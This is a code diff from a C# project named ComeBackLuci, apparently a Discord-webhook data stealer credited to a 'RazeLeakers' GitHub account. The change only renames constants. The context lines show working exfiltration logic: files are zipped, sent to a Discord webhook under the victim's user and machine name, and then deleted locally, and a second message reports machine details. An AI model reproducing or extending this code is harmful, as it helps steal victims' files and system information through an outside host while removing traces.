@@ -9,10 +9,10 @@ namespace ComeBackLuci
 {
     public static class ClientManager
     {
-        private const string author = "M3RFR3T";
-        private const string username = "ComeBackLuci";
-        private const string credit = "github.com/RazeLeakers";
-        private const string avatarURL = "https://avatars.githubusercontent.com/u/154272786?s=200&v=4";
+        private const string AUTHOR = "M3RFR3T";
+        private const string USERNAME = "ComeBackLuci";
+        private const string CREDIT = "github.com/RazeLeakers";
+        private const string AVATAR_URL = "https://avatars.githubusercontent.com/u/154272786?s=200&v=4";
 
         public static async void SendFile(string fileSend)
         {
@@ -47,7 +47,7 @@ namespace ComeBackLuci
                         {
                             ZipFile.CreateFromDirectory(errorDir, zipSend);
 
-                            await client.SendFileAsync(zipSend, $"**Error ({errorFiles.Length})**", false, null, username, avatarURL);
+                            await client.SendFileAsync(zipSend, $"**Error ({errorFiles.Length})**", false, null, USERNAME, AVATAR_URL);
 
                             foreach (var file in errorFiles) File.Delete(file);
                         }
@@ -55,7 +55,7 @@ namespace ComeBackLuci
                         finally { if (File.Exists(zipSend)) File.Delete(zipSend); }
                     }
 
-                    await client.SendFileAsync(fileSend, $"**{Environment.UserName} - {Environment.MachineName}**", false, null, username, avatarURL);
+                    await client.SendFileAsync(fileSend, $"**{Environment.UserName} - {Environment.MachineName}**", false, null, USERNAME, AVATAR_URL);
 
                     File.Delete(fileSend);
                 }
@@ -75,20 +75,20 @@ namespace ComeBackLuci
             eb.AddField("Machine:", $"{Environment.MachineName}");
             eb.AddField("Processor: ", $"{Environment.ProcessorCount}");
             eb.AddField("Screen: ", $"{Screen.PrimaryScreen.Bounds.Size.Width} x {Screen.PrimaryScreen.Bounds.Size.Height}");
-            eb.WithFooter($"{credit} | {author}");
+            eb.WithFooter($"{CREDIT} | {AUTHOR}");
 
             try
             {
                 using (DiscordWebhookClient client = new DiscordWebhookClient(webhook))
                 {
-                    await client.SendMessageAsync(null, false, embeds: new Embed[] { eb.Build() }, username, avatarURL);
+                    await client.SendMessageAsync(null, false, embeds: new Embed[] { eb.Build() }, USERNAME, AVATAR_URL);
                 }
 
-                MessageBox.Show("Send!", username, MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("Send!", USERNAME, MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Error: {ex.Message}", username, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                MessageBox.Show($"Error: {ex.Message}", USERNAME, MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
         }
     }
